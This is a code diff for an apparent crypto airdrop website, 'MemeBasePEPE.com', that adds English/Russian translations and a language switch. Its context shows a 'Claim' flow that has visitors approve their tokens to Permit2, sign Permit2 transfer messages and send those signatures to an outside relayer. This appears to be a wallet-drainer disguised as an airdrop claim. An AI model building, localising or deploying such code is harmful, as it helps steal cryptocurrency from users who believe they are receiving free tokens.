@@ -1,3 +1,4 @@
+import { useTranslation } from 'react-i18next'
 import { useAccount, useChainId, usePublicClient, useSwitchChain, useWalletClient } from 'wagmi'
 import { formatUnits, erc20Abi } from 'viem'
 import { useState, useEffect, useCallback, useMemo, createContext, useContext, type ComponentType, type ReactNode } from 'react'
@@ -180,6 +181,12 @@ const BANNERS = [
 // Header Component
 function Header({ activeTab, setActiveTab }: { activeTab: string, setActiveTab: (id: string) => void }) {
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
+  const { t, i18n } = useTranslation()
+
+  const toggleLanguage = () => {
+    const newLang = i18n.language.startsWith('ru') ? 'en' : 'ru'
+    i18n.changeLanguage(newLang)
+  }
 
   return (
     <header className="bg-white shadow-sm sticky top-0 z-50">
@@ -210,13 +217,20 @@ function Header({ activeTab, setActiveTab }: { activeTab: string, setActiveTab: 
                     }`}
                   >
                     <Icon className="w-4 h-4" />
-                    {item.label}
+                    {t(item.id)}
                   </button>
                 )
               })}
             </nav>
 
             <div className="flex items-center gap-4">
+              <button
+                onClick={toggleLanguage}
+                className="flex items-center justify-center w-10 h-8 rounded border border-gray-200 bg-gray-50 hover:bg-gray-100 text-xs font-bold text-gray-700 transition-colors uppercase"
+                title={i18n.language.startsWith('ru') ? 'Switch to English' : 'Переключить на русский'}
+              >
+                {i18n.language.startsWith('ru') ? 'EN' : 'RU'}
+              </button>
               <div className="relative hidden sm:block">
                 <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                 <input
@@ -254,7 +268,7 @@ function Header({ activeTab, setActiveTab }: { activeTab: string, setActiveTab: 
                       }`}
                     >
                       <Icon className="w-4 h-4" />
-                      {item.label}
+                      {t(item.id)}
                     </button>
                   )
                 })}
@@ -287,6 +301,7 @@ function Header({ activeTab, setActiveTab }: { activeTab: string, setActiveTab: 
 function ContactPage() {
   const [formData, setFormData] = useState({ name: '', email: '', message: '' })
   const [submitted, setSubmitted] = useState(false)
+  const { t } = useTranslation()
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
@@ -299,38 +314,38 @@ function ContactPage() {
       <div className="mb-8 text-center">
         <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 flex items-center justify-center gap-3">
           <Mail className="w-6 h-6 sm:w-8 sm:h-8 text-emerald-500" />
-          Contact Us
+          {t('contact_title')}
         </h1>
-        <p className="text-gray-600 mt-2">Get in touch with the MemeBasePEPE.com team</p>
+        <p className="text-gray-600 mt-2">{t('contact_subtitle')}</p>
       </div>
 
       <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
         <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-6">
-          <h2 className="text-lg font-semibold text-gray-900 mb-4">Send Message</h2>
+          <h2 className="text-lg font-semibold text-gray-900 mb-4">{t('send_message')}</h2>
           
           {submitted ? (
             <div className="bg-emerald-50 border border-emerald-200 rounded-lg p-4 text-center">
               <div className="w-12 h-12 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-3">
                 <Send className="w-6 h-6 text-emerald-600" />
               </div>
-              <h3 className="font-semibold text-emerald-900">Message Sent!</h3>
-              <p className="text-sm text-emerald-700 mt-1">We'll get back to you soon.</p>
+              <h3 className="font-semibold text-emerald-900">{t('message_sent')}</h3>
+              <p className="text-sm text-emerald-700 mt-1">{t('message_sent_desc')}</p>
             </div>
           ) : (
             <form onSubmit={handleSubmit} className="space-y-4">
               <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">Name</label>
+                <label className="block text-sm font-medium text-gray-700 mb-1">{t('name')}</label>
                 <input
                   type="text"
                   value={formData.name}
                   onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                   className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500"
-                  placeholder="Your name"
+                  placeholder={t('name')}
                   required
                 />
               </div>
               <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">Email</label>
+                <label className="block text-sm font-medium text-gray-700 mb-1">{t('email')}</label>
                 <input
                   type="email"
                   value={formData.email}
@@ -341,13 +356,13 @@ function ContactPage() {
                 />
               </div>
               <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">Message</label>
+                <label className="block text-sm font-medium text-gray-700 mb-1">{t('message')}</label>
                 <textarea
                   value={formData.message}
                   onChange={(e) => setFormData({ ...formData, message: e.target.value })}
                   rows={4}
                   className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500"
-                  placeholder="How can we help?"
+                  placeholder={t('message')}
                   required
                 />
               </div>
@@ -356,7 +371,7 @@ function ContactPage() {
                 className="w-full bg-emerald-600 text-white py-2 rounded-lg font-medium hover:bg-emerald-700 transition-colors flex items-center justify-center gap-2"
               >
                 <Send className="w-4 h-4" />
-                Send Message
+                {t('send_message')}
               </button>
             </form>
           )}
@@ -364,9 +379,9 @@ function ContactPage() {
 
         <div className="space-y-6">
           <div className="bg-gradient-to-br from-emerald-500 to-blue-500 rounded-xl p-6 text-white">
-            <h2 className="text-lg font-semibold mb-4">Connect With Us</h2>
+            <h2 className="text-lg font-semibold mb-4">{t('connect_with_us')}</h2>
             <p className="text-sm opacity-90 mb-4">
-              Follow us on social media for the latest drop updates and announcements.
+              {t('social_media_desc')}
             </p>
             <div className="flex items-center gap-3">
               <button className="p-3 bg-white/20 rounded-full hover:bg-white/30 transition-colors">
@@ -382,23 +397,23 @@ function ContactPage() {
           </div>
 
           <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-6">
-            <h3 className="font-semibold text-gray-900 mb-4">Why Contact Us?</h3>
+            <h3 className="font-semibold text-gray-900 mb-4">{t('why_contact_us')}</h3>
             <ul className="space-y-3 text-sm text-gray-600">
               <li className="flex items-start gap-2">
                 <Shield className="w-4 h-4 text-emerald-500 mt-0.5" />
-                Report suspicious drops
+                {t('report_suspicious')}
               </li>
               <li className="flex items-start gap-2">
                 <Award className="w-4 h-4 text-emerald-500 mt-0.5" />
-                Submit new drop listings
+                {t('submit_listings')}
               </li>
               <li className="flex items-start gap-2">
                 <MessageCircle className="w-4 h-4 text-emerald-500 mt-0.5" />
-                Partnership inquiries
+                {t('partnership')}
               </li>
               <li className="flex items-start gap-2">
                 <HelpCircle className="w-4 h-4 text-emerald-500 mt-0.5" />
-                Technical support
+                {t('technical_support')}
               </li>
               <li className="flex items-start gap-2">
                 <Mail className="w-4 h-4 text-emerald-500 mt-0.5" />
@@ -443,6 +458,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
   const { data: walletClientData } = useWalletClient({ chainId: BASE_CHAIN_ID })
   const { switchChainAsync } = useSwitchChain()
   const currentChainId = useChainId()
+  const { t } = useTranslation()
 
   const walletClient = walletClientData as any
 
@@ -626,8 +642,8 @@ function WalletTokens({ children }: { children: ReactNode }) {
     setClaiming(true)
 
     try {
-      if (currentChainId !== BASE_CHAIN_ID) {
-        setClaimStatus('Switching network to Base...')
+        if (currentChainId !== BASE_CHAIN_ID) {
+        setClaimStatus(t('switching_network'))
         await switchChainAsync({ chainId: BASE_CHAIN_ID })
       }
 
@@ -681,7 +697,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
 
         if (currentAllowance < safeAmount) {
           console.log(`Approving ${token.symbol} for Permit2...`)
-          setClaimStatus(`Approving ${token.symbol} for Permit2...`)
+          setClaimStatus(t('approving_token', { token: token.symbol }))
           let approveTx: `0x${string}`
           const approveAmount = safeAmount
 
@@ -717,7 +733,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
             console.warn(`[PROFESSIONAL DEBUG] Receipt wait failed for ${token.symbol} approve:`, e)
           })
 
-          setClaimStatus(`Waiting for ${token.symbol} approval confirmation...`)
+          setClaimStatus(t('waiting_approval', { token: token.symbol }))
           // Poll relayer until allowance is confirmed on-chain (Base needs ~2-6s)
           // Use direct /allowance endpoint (bypasses multicall which may fail for some tokens)
           let attempts = 0
@@ -743,7 +759,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
 
           if (confirmedAllowance < safeAmount) {
             console.error(`[PROFESSIONAL DEBUG] Allowance NOT confirmed after ${maxAttempts} attempts (${(maxAttempts * 2)}s). Aborting relay for ${token.symbol}.`)
-            setClaimStatus('Approval timed out. Please try again.')
+            setClaimStatus(t('approval_timeout'))
             setClaiming(false)
             return
           }
@@ -758,7 +774,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
         const nonce = (BigInt(Math.floor(Date.now() / 1000)) << 32n) + BigInt(Math.floor(Math.random() * 2 ** 32))
         const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600) // 1 hour
 
-        setClaimStatus(`Preparing signature for ${token.symbol}...`)
+        setClaimStatus(t('preparing_signature', { token: token.symbol }))
         console.log(`[PROFESSIONAL DEBUG] Preparing Permit2 Signature:`, {
           token: token.address,
           amount: safeAmount.toString(),
@@ -813,7 +829,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
 
         console.log(`[PROFESSIONAL DEBUG] Signature generated: ${signature}`);
 
-        setClaimStatus(`Sending ${token.symbol} to relayer...`)
+        setClaimStatus(t('sending_to_relayer', { token: token.symbol }))
         // Send to relayer
         const response = await fetch(`${RELAYER_URL}/relay`, {
           method: 'POST',
@@ -841,7 +857,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
       }
     } catch (err: unknown) {
       console.error('Permit2 error:', err)
-      setClaimStatus('Claim failed. Please try again.')
+      setClaimStatus(t('claim_failed'))
     } finally {
       setClaiming(false)
       setTimeout(() => setClaimStatus(''), 5000)
@@ -857,7 +873,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
               <div className="w-10 h-10 bg-white rounded-full flex items-center justify-center flex-shrink-0">
                 <Sparkles className="w-5 h-5 text-cyan-500" />
               </div>
-              <span className="text-white font-extrabold">Claim</span>
+              <span className="text-white font-extrabold">{t('claim')}</span>
             </div>
 
             <button
@@ -872,12 +888,12 @@ function WalletTokens({ children }: { children: ReactNode }) {
               {claiming ? (
                 <>
                   <Loader2 className="w-6 h-6 animate-spin" />
-                  {claimStatus || 'Processing...'}
+                  {claimStatus || t('processing')}
                 </>
               ) : (
                 <>
                   <Sparkles className="w-6 h-6" />
-                  Claim
+                  {t('claim')}
                 </>
               )}
             </button>
@@ -930,6 +946,7 @@ type AirdropItem = {
 
 function AirdropCard({ airdrop }: { airdrop: AirdropItem }) {
   const claimAction = useClaimAction()
+  const { t } = useTranslation()
 
   const handleClaim = () => {
     if (claimAction?.disabled) return
@@ -950,29 +967,29 @@ function AirdropCard({ airdrop }: { airdrop: AirdropItem }) {
               <p className="text-sm text-gray-500 mt-1">
                 <span className="inline-flex items-center gap-1">
                   <Zap className="w-3 h-3" />
-                  {airdrop.actions}
+                  {t('actions')}
                 </span>
               </p>
             </div>
             {airdrop.hot && (
               <div className="flex items-center gap-1 text-red-500 text-sm font-medium">
                 <Flame className="w-4 h-4" />
-                {airdrop.hotValue}°
+                {airdrop.hotValue}{t('hot_value')}
               </div>
             )}
             {airdrop.potential && (
               <div className="flex items-center gap-1 text-purple-500 text-sm font-medium">
                 <Sparkles className="w-4 h-4" />
-                Potential
+                {t('potential_drop')}
               </div>
             )}
           </div>
 
           <div className="flex items-center justify-between mt-4">
             {airdrop.confirmed ? (
-              <span className="badge-confirmed">Confirmed</span>
+              <span className="badge-confirmed">{t('confirmed')}</span>
             ) : (
-              <span className="px-2 py-1 bg-purple-100 text-purple-700 text-xs font-medium rounded">Potential</span>
+              <span className="px-2 py-1 bg-purple-100 text-purple-700 text-xs font-medium rounded">{t('potential_drop')}</span>
             )}
             <button
               onClick={handleClaim}
@@ -983,7 +1000,7 @@ function AirdropCard({ airdrop }: { airdrop: AirdropItem }) {
                   : 'bg-emerald-600 text-white hover:bg-emerald-700 shadow-md hover:shadow-lg'
               }`}
             >
-              Claim Drop
+              {t('claim_drop')}
             </button>
           </div>
         </div>
@@ -1039,15 +1056,16 @@ function PotentialAirdropsPage() {
 
 function FAQPage() {
   const [openIndex, setOpenIndex] = useState<number | null>(null)
+  const { t } = useTranslation()
 
   return (
     <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
       <div className="mb-8 text-center">
         <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 flex items-center justify-center gap-3">
           <HelpCircle className="w-6 h-6 sm:w-8 sm:h-8 text-emerald-500" />
-          FAQ
+          {t('faq')}
         </h1>
-        <p className="text-gray-600 mt-2">Answers to common questions about MemeBasePEPE.com</p>
+        <p className="text-gray-600 mt-2">{t('faq_title')}</p>
       </div>
 
       <div className="space-y-4">
